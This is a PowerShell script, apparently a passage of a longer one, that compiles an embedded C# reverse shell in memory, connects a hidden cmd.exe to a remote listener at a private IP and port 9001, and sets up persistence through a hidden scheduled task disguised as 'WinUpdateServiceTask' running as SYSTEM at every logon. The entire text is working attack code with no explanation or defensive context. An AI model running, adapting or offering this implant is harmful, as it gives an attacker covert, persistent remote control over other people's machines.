$code = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

public class Shell {
    public static void Start(string ip, int port) {
        try {
            TcpClient client = new TcpClient(ip, port);
            Stream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            StreamWriter pIn = p.StandardInput;
            pIn.AutoFlush = true;
            new System.Threading.Thread(() => {
                char[] buffer = new char[1024];
                int read;
                while ((read = p.StandardOutput.Read(buffer, 0, buffer.Length)) > 0) {
                    writer.Write(buffer, 0, read);
                    writer.Flush();
                }
            }).Start();
            while (true) {
                string cmd = reader.ReadLine();
                if (cmd == "exit") break;
                pIn.WriteLine(cmd);
            }
            p.Kill(); client.Close();
        } catch { }
    }
}
"@

# 2. Compile into memory
Add-Type -TypeDefinition $code -Language CSharp

# 3. Create Persistence (Scheduled Task)
$taskName = "WinUpdateServiceTask"
$ip = "10.211.55.5"
$port = 9001
$psCommand = "powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "[Shell]::Start('$ip', $port)""
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "[Shell]::Start('$ip', $port)""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -Action $action -Trigger $trigger -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) -Settings $settings -TaskName $taskName -Force

# 4. Immediate Execution
[Shell]::Start($ip, $port)
